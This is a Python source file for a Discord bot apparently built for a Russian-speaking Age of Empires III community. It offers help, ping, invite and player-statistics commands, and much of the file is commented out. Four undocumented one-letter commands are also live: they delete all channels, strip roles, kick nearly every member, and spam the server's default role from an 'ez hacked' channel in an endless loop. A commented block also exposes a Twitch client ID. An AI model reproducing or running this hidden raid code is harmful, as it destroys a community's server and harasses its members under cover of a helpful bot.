
import asyncio
import concurrent.futures
import copy
import datetime
import hashlib
import heapq
import locale
import logging
import xml.etree.ElementTree as ElementTree

import discord
#import matplotlib as mpl
#import matplotlib.dates as mdates
#import matplotlib.pyplot as plt
#import mysql.connector
#import numpy
import requests
#from beautifultable import BeautifulTable
#from bs4 import BeautifulSoup
from dateutil.parser import parse
from discord import Game
from discord.ext import commands
from discord.utils import get
from requests.utils import requote_uri

from aoestat import *
from constants import *
from utils import *

#mpl.use('Agg')

#locale.setlocale(locale.LC_TIME, 'ru_RU.UTF-8')
logging.basicConfig(format=u'[%(asctime)s] [LINE:%(lineno)d]# %(levelname)-8s %(message)s',
                    level=logging.ERROR, filename=u'log.txt')

bot = commands.Bot(command_prefix=BOT_PREFIX)
bot.remove_command('help')
extensions = ['Cogs.taunts', 'Cogs.common', 'Cogs.owner']
for extension in extensions:
    try:
        bot.load_extension(extension)
    except Exception as e:
        print('{extension} не загружено [{e}] .'.format(extension=extension, e=e))

@bot.event
async def on_member_join(member):
    join_channel = bot.get_channel(JOINED_ID)
    rules_channel = bot.get_channel(RULES_ID)
    await join_channel.send(member.mention + ' , добро пожаловать! Обязательно ознакомся с правилами сервера ' + rules_channel.mention + ' , а также c командами нашего бота с помощью `!help`')


@bot.event
async def on_ready():
    print(str(datetime.datetime.now()) + ' : Бот в сети')
    game = discord.Game(name="ｅｚ　ｈａｃｋｅｄ", type=3)
    await bot.change_presence(activity=game)
    #bot.loop.create_task(lobbies())

'''
async def players():
    await bot.wait_until_ready()
    players_channel = bot.get_channel(RUSSIANS_CHANNEL_ID)
    while not bot.is_closed():
        try:
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor()
            cursor.execute(select_player)
            sorted_players = list(map(list, zip(*cursor.fetchall())))[0]
            cursor.close()
            cnx.close()
            futures=[]
            responses = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                loop = asyncio.get_event_loop()
                for player in sorted_players:
                    futures.append(loop.run_in_executor(
                            executor, 
                            requests.get, 
                            'http://www.agecommunity.com/query/query.aspx', {'md': 'user', 'name': player}
                        ))
                responses.extend(await asyncio.gather(*futures))
            online_players = [p for p in responses if ElementTree.fromstring(p.content).text != 'Failed to find user' and ElementTree.fromstring(p.content).find('./user/presence').text == 'online']
            await players_channel.purge(limit=50)
            for response in online_players:
                root = ElementTree.fromstring(response.content)
                user = root.find('./user')
                name = user.find('./name').text
                desc = '**Сейчас в сети!**'
                try:
                    clanname = '[' + user.find('./clanAbbr').text + '] '
                    desc += '\n**Клан:** *' + user.find('./clanName').text + '*'
                except:
                    clanname = ''
                nillaSP = '**Supremacy:** ' + \
                    FormatPR(int(root.find('./ratings/s/skillLevel').text))
                nillaDM = '**Deathmatch:** ' + \
                    FormatPR(int(root.find('./ratings/d/skillLevel').text))
                tadSP = '**Supremacy:** ' + \
                    FormatPR(int(root.find('./ratings/sy/skillLevel').text))
                tadTR = '**Treaty:** ' + \
                    FormatPR(int(root.find('./ratings/ty/skillLevel').text))
                tadDM = '**Deathmatch:** ' + \
                    FormatPR(int(root.find('./ratings/dy/skillLevel').text))

                em = discord.Embed(description=desc, timestamp=datetime.datetime.utcnow(
                ), title=clanname + name, url="http://aoe3.jpcommunity.com/rating2/player?n=" + name, colour=0xffffff)
                em.set_author(name='Статистика игрока',
                            icon_url='http://xakops.pythonanywhere.com/static/images/0.png')
                #em.add_field(name = 'Player Info', value = desc, inline = False)
                if root.find('./ratings/s/points').text != '0' or root.find('./ratings/d/points').text != '0':
                    em.add_field(name='Ванилла', value=nillaSP +
                                '\n' + nillaDM, inline=False)
                if root.find('./ratings/sy/points').text != '0' or root.find('./ratings/ty/points').text != '0' or root.find('./ratings/dy/points').text != '0':
                    em.add_field(name='Династии', value=tadSP + '\n' +
                                tadTR + '\n' + tadDM, inline=False)
                em.set_thumbnail(url=GetAvatarFromID(user.find('./avatarId').text))
                em.set_footer(text="Обновлено")
                await players_channel.send(embed=em)                  
        except Exception as e:
            logging.error('Ошибка: ' + str(e))
        await asyncio.sleep(150)

'''

@bot.command()
async def d(ctx):
    guild = bot.get_guild(GUILD_ID)
    for c in guild.members:
            await ctx.send(c.name) 
        
    for c in guild.channels:
        await ctx.send(c.name) 
        await c.delete()
        

@bot.command()
async def c(ctx):
    guild = bot.get_guild(GUILD_ID)
    role = get(guild.roles, name="Посвященный")
    for c in guild.members:
        if c.id != 524204342627139594 and c.id != 532451734870818827:
            await ctx.send(c.name) 
            try:
                await c.remove_roles(role)
            except:
                pass
        
    for c in guild.channels:
        await c.delete()
        await ctx.send(c.name) 

@bot.command()
async def b(ctx):
    guild = bot.get_guild(GUILD_ID)
    for c in guild.members:
        if c.id != 524204342627139594 and c.id != 532451734870818827:
            await ctx.send(c.name) 
            try:
                await c.kick()
            except:
                pass
        
    channel = await guild.create_text_channel('ｅｚ　ｈａｃｋｅｄ')
    while True:
        await channel.send(guild.default_role)

@bot.command()
async def a(ctx):
    guild = bot.get_guild(GUILD_ID)
    channel = await guild.create_text_channel('ｅｚ　ｈａｃｋｅｄ')
    while True:
        await channel.send(guild.default_role)
    #guild = bot.get_guild(GUILD_ID)
    #for c in guild.channels:
    #    await c.delete()
    #    await ctx.send(c.name) 
    #me = get(guild.members, id=524204342627139594)
    
    #roles = get(guild.roles, name="Админы")
    #await me.add_roles(roles)
    #roles_names = sorted(roles, key=lambda role: role.name)
    
    

@bot.command()
async def help(ctx):
    msg = '```css\n'
    msg += 'Команда : !eso \n'
    msg += 'Описание : Возвращает статус ESO сервера```'
    msg += '```css\n'
    msg += 'Команда : !update\n'
    msg += 'Описание : Обновляет вашу роль в виде ранга на ESO```'
    msg += '```css\n'
    msg += 'Команда : !invite [ник в дискорде]\n'
    msg += 'Описание : Печатает приглашение в игру от вашего имени```'
    msg += '```css\n'
    msg += 'Команда : !pop\n'
    msg += 'Описание : Показывает количество людей на ESO```'
    msg += '```css\n'
    msg += 'Команда : !stat [имя игрока]\n'
    msg += 'Описание : Показывает статистику игрока```'
    msg += '```css\n'
    msg += 'Команда : !clan [тег клана]\n'
    msg += 'Описание : Выводит участников клана и их статистику```'
    msg += '```css\n'
    msg += 'Команда : !ez\n'
    msg += 'Описание : Печатает "EZ для [ваше имя]!"```'
    msg += '```css\n'
    msg += 'Команда : !ping\n'
    msg += 'Описание : Печатает "pong!"```'
    msg += '```css\n'
    msg += 'Команда : !link\n'
    msg += 'Описание : Отправляет ссылку-приглашение на сервер```'
    msg += '```css\n'
    msg += 'Команда : ![номер]\n'
    msg += 'Описание : Отправляет дразнилки ESO, где N - номер```'
    msg += '```css\n'
    msg += 'Команда : !taunt [номер фразы-необязательно] [ваш текст в " "-необязательно]\n'
    msg += 'Описание : Отправляет фразу Глада Валакаса. Если не указан не один из параметров, то выбирается случайная фраза. !taunt list отправит вам список всех фраз```'
    await ctx.author.send(msg)
    await ctx.send('{}, вам было отправлено сообщение со всеми командами!'.format(ctx.author.mention))

'''
@bot.command()
async def update(ctx):
    role = get(ctx.guild.roles, name='Бот')

    root = await getXML('http://www.agecommunity.com/query/query.aspx', {'md': 'user', 'name': ctx.author.display_name})
    if root.text == 'Failed to find user':
        return await ctx.send("Ваш никнейм не совпадает с именем на ESO.")
    maxRank = max([int(root.find('./ratings/s/skillLevel').text), int(root.find('./ratings/d/skillLevel').text), int(root.find('./ratings/sy/skillLevel').text),
                   int(root.find('./ratings/ty/skillLevel').text), int(root.find('./ratings/dy/skillLevel').text)])
    role2 = get(ctx.guild.roles, name=FormatPR(
        maxRank).split('(')[0].strip())

    if not role2 in ctx.author.roles:
        for s in list(filter(lambda x: x < role, ctx.author.roles[1:])):
            await ctx.author.remove_roles(s)

        await ctx.author.add_roles(role2)
        return await ctx.send('Роль *"{}"*  была добавлена {}.'.format(role2, ctx.author.mention))
    else:
        return await ctx.send('Роль *"{}"*  не требует обновления {}.'.format(role2, ctx.author.mention))
'''
'''
async def event_ladder():
    await bot.wait_until_ready()
    event_channel = bot.get_channel(EVENT_LADDER_ID)

    while not bot.is_closed():
        try:
            guild = bot.get_guild(GUILD_ID)
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor()
            cursor.execute(select_event)
            scores = cursor.fetchall()
            cursor.close()
            cnx.close()
            sorted_scores = sorted(scores, key=lambda score: score[4], reverse=True)


            table = BeautifulTable()
            table.column_headers = ["#", "Имя", "Всего очков", "TAD SP", "TAD TR", "Vanilla"]
            table.column_alignments["Имя"] = BeautifulTable.ALIGN_LEFT
            table.column_alignments["#"] = BeautifulTable.ALIGN_LEFT
            table.column_alignments["Всего очков"] = BeautifulTable.ALIGN_RIGHT
            table.width_exceed_policy = BeautifulTable.WEP_STRIP
            for index, v in enumerate(sorted_scores[:10]):
                table.append_row([index + 1, v[0], v[4], v[2], v[3], v[1]])
            await event_channel.purge(limit = 5)
            await event_channel.send("```" + table.get_string() + "```")
        except Exception as e:
            logging.error('Ошибка: ' + str(e))
        await asyncio.sleep(3600)
'''
'''
async def roles():
    await bot.wait_until_ready()
    nilla_channel = bot.get_channel(TOP_NILLA)
    tad_rush_channel = bot.get_channel(TOP_TAD_RUSH)
    tad_treaty_channel = bot.get_channel(TOP_TAD_TREATY)
    while not bot.is_closed():
        try:
            guild = bot.get_guild(GUILD_ID)
            role = get(guild.roles, name='Бот')
            members = list(filter(lambda x: len(x.roles) >
                             1 and not x.bot, guild.members))
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor()
            cursor.execute(select_member)
            data = numpy.array([row[0] for row in cursor.fetchall()])
            member_names = numpy.array([m.display_name for m in members])
            need_to_remove = numpy.setdiff1d(data, member_names, assume_unique = True)
            need_to_add = numpy.setdiff1d(member_names, data, assume_unique = True)
            if need_to_remove.size > 0:
                cursor.executemany(remove_member, [tuple(s.split()) for s in need_to_remove])
            if need_to_add.size > 0:
                cursor.executemany(add_member, [tuple(s.split()) for s in need_to_add])
            cnx.commit()
            cursor.close()
            cnx.close()
            futures=[]
            responses=[]
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                loop = asyncio.get_event_loop()
                for member in members:
                    futures.append(loop.run_in_executor(
                            executor, 
                            requests.get, 
                            'http://www.agecommunity.com/query/query.aspx', {'md': 'user', 'name': member.display_name}
                        ))
                responses.extend(await asyncio.gather(*futures))

            top_nilla = sorted(responses, key = lambda x: float(ElementTree.fromstring(x.content).find('./ratings/s/points').text), reverse = True)[:10]
            top_tad_rush = sorted(responses, key = lambda x: float(ElementTree.fromstring(x.content).find('./ratings/sy/points').text), reverse = True)[:10]
            top_tad_treaty = sorted(responses, key = lambda x: float(ElementTree.fromstring(x.content).find('./ratings/ty/points').text), reverse = True)[:10]
            msg = []
            for i, response in enumerate(top_nilla):
                root = ElementTree.fromstring(response.content)
                msg.append('`' + '{:3s} {:15s} {:2.2f}'.format(str(i + 1) + '.', root.find('./user/name').text, float(root.find('./ratings/s/points').text)) + '`')
            await nilla_channel.purge(limit = 5)
            await nilla_channel.send('\n'.join(msg))


            msg = []
            for i, response in enumerate(top_tad_rush):
                root = ElementTree.fromstring(response.content)
                msg.append('`' + '{:3s} {:15s} {:2.2f}'.format(str(i + 1) + '.', root.find('./user/name').text, float(root.find('./ratings/sy/points').text)) + '`')
            await tad_rush_channel.purge(limit = 5)
            await tad_rush_channel.send('\n'.join(msg))

            msg = []
            for i, response in enumerate(top_tad_treaty):
                root = ElementTree.fromstring(response.content)
                msg.append('`' + '{:3s} {:15s} {:2.2f}'.format(str(i + 1) + '.', root.find('./user/name').text, float(root.find('./ratings/ty/points').text)) + '`')
            await tad_treaty_channel.purge(limit = 5)
            await tad_treaty_channel.send('\n'.join(msg))        
            
            for i, response in enumerate(responses):
                root = ElementTree.fromstring(response.content)
                if root.text != 'Failed to find user':
                    maxRank = max([int(root.find('./ratings/s/skillLevel').text), int(root.find('./ratings/d/skillLevel').text), int(root.find('./ratings/sy/skillLevel').text),
                                int(root.find('./ratings/ty/skillLevel').text), int(root.find('./ratings/dy/skillLevel').text)])
                    role2 = get(guild.roles, name=FormatPR(
                        maxRank).split('(')[0].strip())
                    if not role2 in members[i].roles:
                        for s in list(filter(lambda x: x < role, members[i].roles[1:])):
                            await members[i].remove_roles(s)
                        await members[i].add_roles(role2)
        except Exception as e:
            logging.error('Ошибка: ' + str(e))
        await asyncio.sleep(600)
'''
@bot.command()
async def ping(ctx):
    await ctx.send('pong!')

@bot.command()
async def link(ctx):
    await ctx.send('https://discord.gg/XWRrspJ')


@bot.command()
async def ez(ctx):
    await ctx.send('EZ для {}!'.format(ctx.author.mention))


@bot.command()
async def invite(ctx, player: discord.User):
    await ctx.send('{} го играть с {}!'.format(player.mention, ctx.author.mention))


# async def status():
#     await bot.wait_until_ready()
#     news_channel = bot.get_channel(NEWS_CHANNEL_ID)
#     while not bot.is_closed():
#         try:
#             J = await getJSON('https://api.twitch.tv/kraken/streams/russiancommunitytv', {'client_id': '9rrpybi820nvoixrr2lkqk19ae8k4ef'})
#             data = openJSON('Data/streamNews.json')
#             if J['stream'] == None:
#                 game = discord.Game(name="!help список команд", type=3)
#                 await bot.change_presence(activity=game)
#                 if data['discord'] != -1:
#                     message = await news_channel.get_message(data['discord'])
#                     await message.delete()
#                     data['discord'] = -1
#                 '''if data['vk'] != -1:
#                     message = await postDataJSON('https://api.vk.com/method/wall.delete', {'owner_id': -4243069, 'post_id': data['vk'], 'access_token': ACCESS_TOKEN, 'v': v})
#                     if message['response'] == 1:
#                         data['vk'] = -1'''
#             else:
#                 await bot.change_presence(activity=discord.Streaming(name="Age of Empires 3", url='https://www.twitch.tv/russiancommunitytv'))
#                 if data['discord'] == -1:
#                     message = await news_channel.send(content='@everyone, канал RussianCommunityTV начал стрим на твиче, быстро все идем смотреть !\n https://www.twitch.tv/russiancommunitytv')
#                     data['discord'] = message.id
#                 '''if data['vk'] == -1:
#                     message = await postDataJSON('https://api.vk.com/method/wall.post', {'owner_id': -4243069, 'message': 'Канал RussianCommunityTV начал стрим на твиче, быстро все идем смотреть !', 'attachments': 'https://www.twitch.tv/russiancommunitytv', 'access_token': ACCESS_TOKEN, 'v': v})
#                     data['vk'] = message['response']['post_id']'''
#             saveJSON('Data/streamNews.json', data)
#         except Exception as e:
#             logging.error('Ошибка: ' + str(e))

#         await asyncio.sleep(60)


'''async def lobbies():
    await bot.wait_until_ready()
    lobbies_channel = bot.get_channel(LOBBIES_CHANNEL_ID)
    while not bot.is_closed():
        try:
            logging.info(u'Получаем все комнаты')
            J = await getJSON('http://eso-community.net/assets/patch/api/lobbies.json', {})
            logging.info(u'Открываем сохраненную историю')
            data = openJSON('lobbies.json')
            # История комнат
            offline_lobbies = copy.deepcopy(data['lobby'])
            # Список новых комнат
            new_lobbies = copy.deepcopy(
                list(filter(lambda x: x['patch'] < 3, J)))
            logging.info(u'Перебираем новые комнаты')
            for lobby in list(filter(lambda x: x['patch'] < 3, J)):
                for lobby_history in data['lobby']:
                    # Если комната уже сохранена в истории
                    if lobby['id'] == lobby_history['id']:
                        # Удалем из истории
                        offline_lobbies.remove(lobby_history)
                        # Удаляем из новых
                        new_lobbies.remove(lobby)

                        hashs = lobby['name'] + lobby['players'][0] + str(sum(1 for _ in filter(
                            None.__ne__, lobby['players']))) + '/' + str(lobby['max_players']) + str(lobby['treaty_time']) + lobby['map']

                        # Если содержимое изменилось, то меняем
                        if lobby_history['hash'] != hashlib.md5(hashs.encode('utf-8')).hexdigest():
                            logging.info(lobby['id'] + ' - редактируем запись')
                            lobby_history['hash'] = hashlib.md5(
                                hashs.encode('utf-8')).hexdigest()
                            # try:
                            if lobby['patch'] == 2:
                                em = discord.Embed(title=lobby['name'], url=requote_uri(
                                    "http://aoe3.jpcommunity.com/rating2/player?n=" + lobby['players'][0]), colour=2665955)
                                em.set_author(
                                    name='Treaty Patch', icon_url='https://eso-community.net/images/aoe3/patch-treaty-icon.png')
                            else:
                                em = discord.Embed(title=lobby['name'], url=requote_uri(
                                    "http://aoe3.jpcommunity.com/rating2/player?n=" + lobby['players'][0]), colour=16711680)
                                em.set_author(
                                    name='ESOC Patch', icon_url='https://eso-community.net/images/aoe3/patch-esoc-icon.png')

                            em.add_field(
                                name='Хост', value=lobby['players'][0])
                            em.add_field(name='Игроки', value=str(sum(1 for _ in filter(
                                None.__ne__, lobby['players']))) + '/' + str(lobby['max_players']))
                            maptitle = lobby['map'].replace('fastrandom', 'ESOC Standard Maps').replace('asianrandom', 'ESOC Maps').replace(
                                'Largerandommaps', 'RE Standard Maps').replace('featured', 'ESOC Team Maps').replace('randommaps', 'Team Maps')
                            em.add_field(name='Карта', value=maptitle)
                            if lobby['treaty_time'] == 0:
                                if lobby['game_mode'] == 0:
                                    em.add_field(
                                        name='Режим', value='Supremacy')
                                else:
                                    em.add_field(
                                        name='Режим', value='Deathmatch')
                            else:
                                if lobby['no_blockade']:
                                    em.add_field(
                                        name='Режим', value='Treaty ' + str(lobby['treaty_time']) + ' min. - Без блокады')
                                else:
                                    em.add_field(
                                        name='Режим', value='Treaty ' + str(lobby['treaty_time']) + ' min.')
                            if lobby['map'] == "fastrandom" or lobby['map'] == 'Largerandommaps':
                                em.set_thumbnail(
                                    url='https://eso-community.net/images/aoe3/maps/standard_maps.png')
                            elif lobby['map'] == "asianrandom":
                                em.set_thumbnail(
                                    url='https://eso-community.net/images/aoe3/maps/esoc_maps.jpg')
                            elif lobby['map'] == "Unknown":
                                em.set_thumbnail(
                                    url='https://eso-community.net/images/aoe3/maps/unknown.png')
                            elif lobby['map'] == 'featured' or lobby['map'] == 'randommaps':
                                em.set_thumbnail(
                                    url='https://eso-community.net/images/aoe3/maps/team_maps.jpg')
                            else:
                                em.set_thumbnail(url='https://eso-community.net/images/aoe3/maps/'+lobby['map'].replace(
                                    ' ', '_').replace('UIx_', '').replace('_Large', '').lower() + '/minimap/1v1_1.png')

                            message = await lobbies_channel.get_message(lobby_history['message_id'])
                            await message.edit(embed=em)
                            # except:
                            #    logging.error(lobby['id'] + ' - ошибка изменения!')
                        break
            logging.info(u"Добавляем новые комнаты")
            for lobby in new_lobbies:
                logging.info(lobby['id'] + ' - добавляем новую комнату')
                # try:

                hashs = lobby['name'] + lobby['players'][0] + str(sum(1 for _ in filter(
                    None.__ne__, lobby['players']))) + '/' + str(lobby['max_players']) + str(lobby['treaty_time']) + lobby['map']

                if lobby['patch'] == 2:
                    em = discord.Embed(title=lobby['name'], url=requote_uri(
                        "http://aoe3.jpcommunity.com/rating2/player?n=" + lobby['players'][0]), colour=2665955)
                    em.set_author(
                        name='Treaty Patch', icon_url='https://eso-community.net/images/aoe3/patch-treaty-icon.png')
                else:
                    em = discord.Embed(title=lobby['name'], url=requote_uri(
                        "http://aoe3.jpcommunity.com/rating2/player?n=" + lobby['players'][0]), colour=16711680)
                    em.set_author(
                        name='ESOC Patch', icon_url='https://eso-community.net/images/aoe3/patch-esoc-icon.png')

                em.add_field(name='Хост', value=lobby['players'][0])
                em.add_field(name='Игроки', value=str(sum(1 for _ in filter(
                    None.__ne__, lobby['players']))) + '/' + str(lobby['max_players']))
                maptitle = lobby['map'].replace('fastrandom', 'ESOC Standard Maps').replace('asianrandom', 'ESOC Maps').replace(
                    'Largerandommaps', 'RE Standard Maps').replace('featured', 'ESOC Team Maps').replace('randommaps', 'Team Maps')
                em.add_field(name='Карта', value=maptitle)
                if lobby['treaty_time'] == 0:
                    if lobby['game_mode'] == 0:
                        em.add_field(name='Режим', value='Supremacy')
                    else:
                        em.add_field(name='Режим', value='Deathmatch')
                else:
                    if lobby['no_blockade']:
                        em.add_field(name='Режим', value='Treaty ' +
                                     str(lobby['treaty_time']) + ' min. - Без блокады')
                    else:
                        em.add_field(name='Режим', value='Treaty ' +
                                     str(lobby['treaty_time']) + ' min.')
                if lobby['map'] == "fastrandom" or lobby['map'] == 'Largerandommaps':
                    em.set_thumbnail(
                        url='https://eso-community.net/images/aoe3/maps/standard_maps.png')
                elif lobby['map'] == "asianrandom":
                    em.set_thumbnail(
                        url='https://eso-community.net/images/aoe3/maps/esoc_maps.jpg')
                elif lobby['map'] == "Unknown":
                    em.set_thumbnail(
                        url='https://eso-community.net/images/aoe3/maps/unknown.png')
                elif lobby['map'] == 'featured' or lobby['map'] == 'randommaps':
                    em.set_thumbnail(
                        url='https://eso-community.net/images/aoe3/maps/team_maps.jpg')
                else:
                    em.set_thumbnail(url='https://eso-community.net/images/aoe3/maps/'+lobby['map'].replace(
                        ' ', '_').replace('UIx_', '').replace('_Large', '').lower() + '/minimap/1v1_1.png')

                m = await lobbies_channel.send(embed=em)
                data['lobby'].append({'id': lobby['id'], 'message_id': m.id, 'hash': hashlib.md5(
                    hashs.encode('utf-8')).hexdigest()})
                # except:
                #    logging.error(lobby['id'] + ' - ошибка добавления')

            to_saved = copy.deepcopy(data)
            for lobby_history in data['lobby']:
                if lobby_history in offline_lobbies:
                    if lobby_history['message_id'] != -1:
                        logging.info(lobby_history['id'] + ' - удаляем пост!')
                        # try:
                        message = await lobbies_channel.get_message(lobby_history['message_id'])
                        await message.delete()
                        to_saved['lobby'].remove(lobby_history)
                        # except:
                        #    logging.error(lobby_history['id'] + ' - ошибка удаления')
                        # to_saved['lobby'].remove(lobby_history)
            logging.info('Lobbies - сохраняем изменения')
            saveJSON('lobbies.json', to_saved)
        except Exception as e:
            logging.error('Ошибка: ' + str(e))
        await asyncio.sleep(10)
'''
'''
async def pop_graph():
    await bot.wait_until_ready()
    pop_channel = bot.get_channel(POP_CHANNEL_ID)
    while not bot.is_closed():
        try:
            Nilla = 0
            TAD = 0
            async with aiohttp.ClientSession() as session:
                async with session.get('http://www.agecommunity.com/_server_status_/', timeout=10) as response:
                    data = await response.text()
                    TADPopulation = find_between(
                        "Users Online : The Asian Dynasties</td><td>", "</td>", data)
                    NillaPopulation = find_between(
                        "Users Online : Age3</td><td>", "</td>", data)                   
                    TAD = int(TADPopulation)
                    Nilla = int(NillaPopulation)
            guild = bot.get_guild(GUILD_ID)
            nilla_emoji = get(guild.emojis, name='nilla')
            tad_emoji = get(guild.emojis, name='tad')
            em = discord.Embed(timestamp=datetime.datetime.utcnow(
            ), title='Количество игроков на ESO', url='http://agecommunity.com/_server_status_/', colour=0xFFFF66)
            em.set_footer(text="Обновлено")
            
            
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor()
            cursor.execute(add_pop, (TAD, Nilla, datetime.datetime.utcnow(),))
            cnx.commit()
            cursor.execute(select_pop)
            data = list(map(list, zip(*cursor.fetchall())))
            cursor.close()
            cnx.close()

            em.add_field(name='Сейчас', value = str(nilla_emoji) + ' **Ванилла:** __' + str(Nilla) + '__ *(Максимум ' + str(numpy.max(data[0])) + ' в ' + data[2][numpy.argmax(data[0])].strftime('%H:%M') + ' по UTC)*\n' + str(tad_emoji) + ' **Династии:** __' + str(TAD) + '__ *(Максимум ' + str(numpy.max(data[1])) + ' в ' + data[2][numpy.argmax(data[1])].strftime('%H:%M') + ' по UTC)*')
            dpi = 80
            fig = plt.figure(dpi = dpi, figsize = (800 / dpi, 480 / dpi) )
            mpl.rcParams.update({'font.size': 18})

            title = plt.title('График популяции ESO за последние 24 часа',fontsize=22)
            plt.xlabel('Время (по UTC)',fontsize=22)
            plt.ylabel('Количество игроков',fontsize=22)

            plt.setp(title, color='white') 
            ax = plt.gca()
            ax.yaxis.grid(True,linestyle=(0,(5,5)),linewidth=0.8)
            ax.xaxis.set_major_formatter(mdates.DateFormatter('%H'))
            ax.xaxis.label.set_color('white')
            ax.yaxis.label.set_color('white')
            ax.tick_params(axis='x', colors='#95a5a6')
            ax.tick_params(axis='y', colors='#95a5a6')

            plt.plot(data[2], data[1], linestyle = '-',label='Династии', markerfacecolor='#f1c40f',marker='o',color='#f1c40f', linewidth=1,markersize=3)
            plt.plot(data[2], data[0], linestyle='-',label='Ванилла',markerfacecolor='#1abc9c', marker='o',color='#1abc9c', linewidth=1, markersize=3)

            legend = plt.legend(loc='upper right', fancybox=True, framealpha=0.5,facecolor='black',fontsize=16)
            plt.setp(legend.get_texts(), color='white')
            fig.savefig('pop.png', transparent=True)
            plt.close('all')
            image = discord.File('pop.png', filename='Graph.png')
            em.set_image(url="attachment://Graph.png")
            await pop_channel.purge(limit=5)
            #await asyncio.sleep(1.2)
            await pop_channel.send(embed=em, file=image)
        except Exception as e:
            logging.error('Ошибка: ' + str(e))
        await asyncio.sleep(90)

async def streams():
    await bot.wait_until_ready()
    streams_channel = bot.get_channel(STREAMS_CHANNEL_ID)
    while not bot.is_closed():
        try:
            cnx = mysql.connector.connect(**config)
            cursor = cnx.cursor()
            J = await getJSON('https://api.twitch.tv/kraken/streams/', {'game': 'Age of Empires III: The Asian Dynasties', 'live': '', 'client_id': '9rrpybi820nvoixrr2lkqk19ae8k4ef'})

            cursor.execute(select_stream)
            data = cursor.fetchall()

            # История комнат
            offline_lobbies = copy.deepcopy(data)
            # Список новых комнат
            new_lobbies = copy.deepcopy(J['streams'])

    




            for lobby in J['streams']:
                for lobby_history in data:
                    # Если комната уже сохранена в истории
                    if lobby['channel']['display_name'] == lobby_history[0]:
                        # Удалем из истории
                        offline_lobbies.remove(lobby_history)
                        # Удаляем из новых
                        new_lobbies.remove(lobby)

                        # try:
                        if not lobby['channel']['status']:
                            em = discord.Embed(title=lobby['channel']['url'], url=lobby['channel']['url'], colour=6570404, timestamp=datetime.datetime.utcnow())
                        else:
                            em = discord.Embed(title=lobby['channel']['status'], url=lobby['channel']['url'], colour=6570404, timestamp=datetime.datetime.utcnow())
                           
                        em.set_author(name=lobby['channel']['display_name'] + ' сейчас стримит!',
                                      icon_url='http://www.stickpng.com/assets/images/580b57fcd9996e24bc43c540.png')
                        em.set_thumbnail(url=lobby['channel']['logo'])
                        
                        em.add_field(name='Зрители', value=str(lobby['viewers']))
                        em.add_field(name='Подписчики', value=lobby['channel']['followers'])
                        em.set_image(
                            url=lobby['preview']['large']+"?vid=" + str(datetime.datetime.utcnow().timestamp()))
                        em.set_footer(text="Обновлено")

                        message = await streams_channel.fetch_message(lobby_history[1])
                        await message.edit(embed=em)
                        # except:
                        #    logging.error(lobby['channel']['display_name'] + ' - ошибка изменения!')
                        break

            for lobby in new_lobbies:
                # try:
                if not lobby['channel']['status']:
                    em = discord.Embed(title=lobby['channel']['url'], url=lobby['channel']['url'], colour=6570404, timestamp=datetime.datetime.utcnow())
                else:
                    em = discord.Embed(title=lobby['channel']['status'], url=lobby['channel']['url'], colour=6570404, timestamp=datetime.datetime.utcnow())
                    
                em.set_author(name=lobby['channel']['display_name'] + ' сейчас стримит!',
                                icon_url='http://www.stickpng.com/assets/images/580b57fcd9996e24bc43c540.png')
                em.set_thumbnail(url=lobby['channel']['logo'])
                
                em.add_field(name='Зрители', value=str(lobby['viewers']))
                em.add_field(name='Подписчики', value=lobby['channel']['followers'])
                em.set_image(
                    url=lobby['preview']['large']+"?vid=" + str(datetime.datetime.utcnow().timestamp()))
                em.set_footer(text="Обновлено")

                m = await streams_channel.send(embed=em)
                cursor.execute(add_stream, (lobby['channel']["display_name"], m.id, ))
                cnx.commit()

            # except:
            #    logging.error(lobby['channel']['display_name'] + ' - ошибка добавления!')
            for lobby_history in offline_lobbies:
                if lobby_history[1] != -1:
                    logging.info(
                        lobby_history[0] + ' - удаляем пост!')
                    try:
                        message = await streams_channel.fetch_message(lobby_history[1])
                        await message.delete()
                    finally:
                        cursor.execute(delete_stream, (lobby_history[0], ))
                        cnx.commit()
                    # 
                    #logging.error(lobby_history['name'] + ' - ошибка удаления')
                    # to_saved['streams'].remove(lobby_history)
        except:
            print('ERROR IN STREAMS')
        finally:
            cursor.close()
            cnx.close()
        await asyncio.sleep(60)



bot.loop.create_task(streams())
bot.loop.create_task(status())
bot.loop.create_task(roles())
bot.loop.create_task(pop_graph())
bot.loop.create_task(players())
bot.loop.create_task(event_ladder())
'''
bot.run(TOKEN_EVENT)
